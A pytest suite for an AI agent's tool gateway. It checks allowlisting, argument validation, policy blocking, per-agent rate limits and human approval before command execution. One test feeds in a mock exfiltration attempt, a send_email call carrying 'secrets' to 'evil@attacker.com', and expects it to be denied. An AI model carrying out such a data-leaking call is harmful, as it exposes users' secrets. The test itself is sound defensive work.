"""
Tests for the Tool Gateway module.

Covers:
  - Allowed tool executes successfully when policy is ALLOW
  - Unknown tool is denied (allowlist check)
  - Missing required arguments are denied (schema check)
  - Policy BLOCK/QUARANTINE prevents execution
  - No proposed tool returns DENIED gracefully
"""

import pytest

from app.approval.workflow import approval_manager
from app.gateway import gateway
from app.gateway.gateway import mediate
from app.models import (
    GatewayDecision,
    PolicyAction,
    PolicyResult,
    PipelineRequest,
    RiskCategory,
    SourceType,
)


@pytest.fixture(autouse=True)
def _reset_shared_state() -> None:
    """Prevent cross-test leakage from approval and rate limiter state."""
    approval_manager._pending.clear()
    approval_manager._resolved.clear()
    gateway.rate_limiter._buckets.clear()


def _policy(action: PolicyAction, req_id: str = "gw-test") -> PolicyResult:
    return PolicyResult(
        request_id=req_id,
        policy_action=action,
        policy_reason="test policy",
        requires_approval=action == PolicyAction.REQUIRE_APPROVAL,
    )


def _request(
    tool: str | None,
    args: dict | None = None,
    req_id: str = "gw-test",
    agent_id: str | None = None,
) -> PipelineRequest:
    return PipelineRequest(
        content="test input",
        source_type=SourceType.DIRECT_PROMPT,
        proposed_tool=tool,
        tool_args=args,
        request_id=req_id,
        agent_id=agent_id,
    )


# ---------------------------------------------------------------------------
# Expected execution
# ---------------------------------------------------------------------------


def test_allowed_tool_executes_on_allow_policy():
    """summarize with correct args and ALLOW policy should EXECUTE."""
    req = _request("summarize", {"text": "Hello world"})
    result = mediate(req, _policy(PolicyAction.ALLOW))

    assert result.gateway_decision == GatewayDecision.EXECUTED
    assert result.tool_output is not None


def test_sanitize_policy_also_allows_execution():
    """SANITIZE is a permitted action — tool should still execute."""
    req = _request("write_note", {"title": "Test", "body": "Content here"})
    result = mediate(req, _policy(PolicyAction.SANITIZE))

    assert result.gateway_decision == GatewayDecision.EXECUTED


# ---------------------------------------------------------------------------
# Allowlist check
# ---------------------------------------------------------------------------


def test_unknown_tool_is_denied():
    """A tool not in the allowlist must be DENIED regardless of policy."""
    req = _request("send_email", {"to": "evil@attacker.com", "body": "secrets"})
    result = mediate(req, _policy(PolicyAction.ALLOW))

    assert result.gateway_decision == GatewayDecision.DENIED
    assert "allowlist" in result.decision_reason.lower()


# ---------------------------------------------------------------------------
# Argument schema check
# ---------------------------------------------------------------------------


def test_missing_args_are_denied():
    """summarize without the required 'text' arg must be DENIED."""
    req = _request("summarize", {})  # missing 'text'
    result = mediate(req, _policy(PolicyAction.ALLOW))

    assert result.gateway_decision == GatewayDecision.DENIED
    assert "missing" in result.decision_reason.lower()


# ---------------------------------------------------------------------------
# Policy gate
# ---------------------------------------------------------------------------


def test_block_policy_denies_execution():
    """BLOCK policy must prevent execution even for allowed tools."""
    req = _request("summarize", {"text": "Blocked content"})
    result = mediate(req, _policy(PolicyAction.BLOCK))

    assert result.gateway_decision == GatewayDecision.DENIED


def test_quarantine_policy_denies_execution():
    """QUARANTINE policy must prevent execution."""
    req = _request("fetch_url", {"url": "https://example.com"})
    result = mediate(req, _policy(PolicyAction.QUARANTINE))

    assert result.gateway_decision == GatewayDecision.DENIED


def test_require_approval_denies_execution():
    """REQUIRE_APPROVAL policy must prevent execution without human sign-off."""
    req = _request("summarize", {"text": "Some text"})
    result = mediate(req, _policy(PolicyAction.REQUIRE_APPROVAL))

    assert result.gateway_decision == GatewayDecision.DENIED


# ---------------------------------------------------------------------------
# No tool proposed
# ---------------------------------------------------------------------------


def test_no_tool_proposed_returns_denied():
    """When no tool is proposed the gateway should return DENIED gracefully."""
    req = _request(tool=None)
    result = mediate(req, _policy(PolicyAction.ALLOW))

    assert result.gateway_decision == GatewayDecision.DENIED


def test_rate_limit_isolated_by_agent():
    """Exhausting one agent's bucket should not affect another agent."""
    req_a = _request("summarize", {"text": "hello"}, req_id="a1", agent_id="agent-a")
    req_b = _request("summarize", {"text": "hello"}, req_id="b1", agent_id="agent-b")

    # Spend most of agent-a budget quickly.
    for i in range(10):
        result = mediate(req_a.model_copy(update={"request_id": f"a-{i}"}), _policy(PolicyAction.ALLOW, req_id=f"a-{i}"))
    # One extra call should be denied for agent-a at default burst.
    denied = mediate(req_a.model_copy(update={"request_id": "a-over"}), _policy(PolicyAction.ALLOW, req_id="a-over"))

    # Agent-b should still execute with a fresh bucket.
    allowed_b = mediate(req_b, _policy(PolicyAction.ALLOW, req_id="b1"))

    assert denied.gateway_decision == GatewayDecision.DENIED
    assert "agent-a" in denied.decision_reason
    assert allowed_b.gateway_decision == GatewayDecision.EXECUTED


def test_summarize_oversize_requires_approval(monkeypatch: pytest.MonkeyPatch):
    """Oversized summarize requests should be queued for approval even with ALLOW policy."""
    monkeypatch.setattr(gateway, "_SUMMARIZE_LOCAL_MAX_CHARS", 5)
    monkeypatch.setattr(gateway, "_SUMMARIZE_OVERSIZE_REQUIRES_APPROVAL", True)

    req = _request("summarize", {"text": "this exceeds threshold"}, req_id="gw-over-1")
    result = mediate(req, _policy(PolicyAction.ALLOW, req_id="gw-over-1"))

    assert result.gateway_decision == GatewayDecision.DENIED
    assert "queued" in result.decision_reason.lower()
    assert "requires human approval" in result.decision_reason.lower()


def test_summarize_oversize_gate_can_be_disabled(monkeypatch: pytest.MonkeyPatch):
    """When disabled by config, oversize summarize requests should execute normally."""
    monkeypatch.setattr(gateway, "_SUMMARIZE_LOCAL_MAX_CHARS", 5)
    monkeypatch.setattr(gateway, "_SUMMARIZE_OVERSIZE_REQUIRES_APPROVAL", False)

    req = _request("summarize", {"text": "this exceeds threshold"}, req_id="gw-over-2")
    result = mediate(req, _policy(PolicyAction.ALLOW, req_id="gw-over-2"))

    assert result.gateway_decision == GatewayDecision.EXECUTED


def test_execute_command_always_requires_approval_first_pass():
    """execute_command should queue even when policy is ALLOW."""
    req = _request("execute_command", {"command": "echo hello"}, req_id="gw-exec-1")
    result = mediate(req, _policy(PolicyAction.ALLOW, req_id="gw-exec-1"))

    assert result.gateway_decision == GatewayDecision.DENIED
    assert "requires human approval" in result.decision_reason.lower()
    assert "queued" in result.decision_reason.lower()


def test_execute_command_executes_after_approval_replay():
    """Replaying an approved request_id should execute the command tool."""
    req = _request("execute_command", {"command": "echo hello"}, req_id="gw-exec-2")

    first = mediate(req, _policy(PolicyAction.ALLOW, req_id="gw-exec-2"))
    assert first.gateway_decision == GatewayDecision.DENIED

    approval = approval_manager.approve("gw-exec-2", approved_by="tester")
    assert approval is not None

    replay = mediate(req, _policy(PolicyAction.ALLOW, req_id="gw-exec-2"))
    assert replay.gateway_decision == GatewayDecision.EXECUTED
    assert replay.tool_output is not None
